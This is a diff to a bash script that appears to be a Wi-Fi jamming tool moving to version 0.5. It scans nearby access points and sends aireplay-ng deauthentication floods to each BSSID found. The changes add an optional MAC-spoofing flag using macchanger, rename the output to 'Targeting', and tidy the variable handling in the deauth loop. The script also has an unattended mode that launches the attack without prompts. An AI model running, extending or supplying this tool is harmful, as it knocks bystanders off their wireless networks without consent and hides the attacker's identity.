@@ -9,13 +9,16 @@
 # SOFTWARE
 
 # Current Version
-VERSION=v0.4
+VERSION="v0.5"
 
-# Default name for wireless interface
-W_INT=wlan0
+# Current and static name for wireless interface
+W_INT="wlan0"
+W_INT_STATIC="wlan0"
 
-# Default name for ethernet interface
-E_INT=eth0
+# Current and static name for ethernet interface
+E_INT="eth0"
+E_INT_STATIC="eth0"
+
 
 # Base name for scan files
 NAME=jam_scan
@@ -25,6 +28,9 @@ re='^[0-9]+$'
 
 # Default DeAuth times for each MAC address
 DE_AUTH_NUMBER=10
+
+# Try to change macs with macchanger
+CHANGE_MACS=0
 
 # Yes to all variable
 YES_TO_ALL=0
@@ -111,16 +117,18 @@ function change_macs {
 
 # Reset the MACs and settings and remove files created
 function cleanup_and_reset {
-    printf "${PROMPT}Reseting the default MAC for Ethernet Interface\n"
-    macchanger -p $E_INT
-    printf "${PROMPT}Reseting the default MAC for Wireless Interface\n"
-    ifconfig $W_INT down
-    sleep 1
-    macchanger -p $W_INT
-    sleep 1
-    iwconfig $W_INT mode Managed
-    sleep 1
-    ifconfig $W_INT up
+    if [[ $CHANGE_MACS -eq 1 ]]; then
+        printf "${PROMPT}Reseting the default MAC for Ethernet Interface\n"
+        macchanger -p $E_INT
+        printf "${PROMPT}Reseting the default MAC for Wireless Interface\n"
+        ifconfig $W_INT down
+        sleep 1
+        macchanger -p $W_INT
+        sleep 1
+        iwconfig $W_INT mode Managed
+        sleep 1
+        ifconfig $W_INT up
+    fi
     if [[ KEEP_SCAN_FILES -eq 0 ]]; then
         printf "${PROMPT}Cleaning up the created files . . .\n"
         rm -f ${NAME}_out.txt
@@ -141,6 +149,7 @@ function warn_before {
 }
 
 function warn_about_interface {
+    printf "${PROMPT}${BROWN}One or more of the intefaces have not been changed\n${NC}"
     printf "${PROMPT}${BROWN}The detected interfaces are: \n${NC}"
     ls /sys/class/net/ | awk '{print "     ",$1}'
     printf "${PROMPT}${BROWN}The defaults are${NC} $W_INT${BROWN} and ${NC}$E_INT\n"
@@ -151,7 +160,6 @@ function warn_about_interface {
     fi
     printf "${PROMPT}${BROWN}Continuing ...${NC}\n"
 }
-
 
 # Prints the help message
 function show_help {
@@ -210,15 +218,15 @@ function scan_area {
     fi
 }
 
-# $1 -> ESSID
-# $2 -> BSSID
-# $3 -> CHANNEL
 function deauth {
+    local essid="$1"
+    local bssid="$2"
+    local channel="$3"
     if [[ "$channel" =~ $re ]]; then
-        echo -e ${PROMPT}DeAuth for: ${RED} "$1" ${NC} with BSSID: "$2" @ ${GREEN}Channel "$3" ${NC}
+        echo -e ${PROMPT}Targeting:${RED} "$essid" ${NC} with BSSID: "$bssid" @ ${GREEN}Channel "$channel" ${NC}
         sleep 3
-        iwconfig $W_INT channel "$3"
-        aireplay-ng -0 $DE_AUTH_NUMBER -a "$2" $W_INT 
+        iwconfig $W_INT channel "$channel"
+        aireplay-ng -0 $DE_AUTH_NUMBER -a "$bssid" $W_INT 
     fi
 }
 
@@ -227,9 +235,7 @@ function read_file_and_deauth {
     # Read the file, line by line and de-auth each MAC 
     while read -r line
     do
-        bssid=`echo $line | awk -F";" '{print $1}'`
-        channel=`echo $line | awk -F";" '{print $2}'`
-        essid=`echo $line | awk -F";" '{print $3}'`
+        read bssid channel essid <<< $(echo $line | awk -F";" '{print $1 " " $2 " " $3}')
         deauth "$essid" "$bssid" "$channel"
     done < ${NAME}_out.txt
 }
@@ -267,6 +273,10 @@ case $key in
         check_number $DE_AUTH_NUMBER
         echo -e "${PROMPT}${GREEN}Setting deauth number to $DE_AUTH_NUMBER ${NC}"
         shift
+    ;;
+    --spoof-mac)
+        CHANGE_MACS=1
+        echo -e "${PROMPT}${GREEN}I will try to change your macs${NC}"
     ;;
     -y|--yes)
         YES_TO_ALL=1
@@ -314,24 +324,22 @@ shift
 done
 
 
-
-
 # Permissions
 check_perm
 
 # Dependencies
 check_dep
 
-# Interface
-warn_about_interface
+# If the default interfaces have not changed, warn the user
+if [[ "$E_INT" == "$E_INT_STATIC" ]] || [[ "$W_INT" == "$W_INT_STATIC" ]]; then
+    warn_about_interface
+fi
 
 # Trap to clean the files and reset at the end
 trap cleanup_and_reset EXIT
 
 # Change directory to the place the script is executed from
 cd "$(dirname "$0")"
-
-
 
 # Show the station names you want to filter out
 if [ ${#WHITE_LIST[@]} -ne 0 ]; then
@@ -343,11 +351,15 @@ fi
 # Do the scan and save the found MAC addresses and channels to a file in a known format
 printf "${PROMPT}${GREEN}Scaning the area for active stations${NC}\n"
 scan_area
-change_macs
+
+if [[ $CHANGE_MACS -eq 1 ]]; then
+  change_macs
+fi
+
 show_detected_stations
 
 # Check if the user wants no interaction
-if [[ YES_TO_ALL -eq 1 ]]; then
+if [[ $YES_TO_ALL -eq 1 ]]; then
     main_attack
     exit 0
 fi
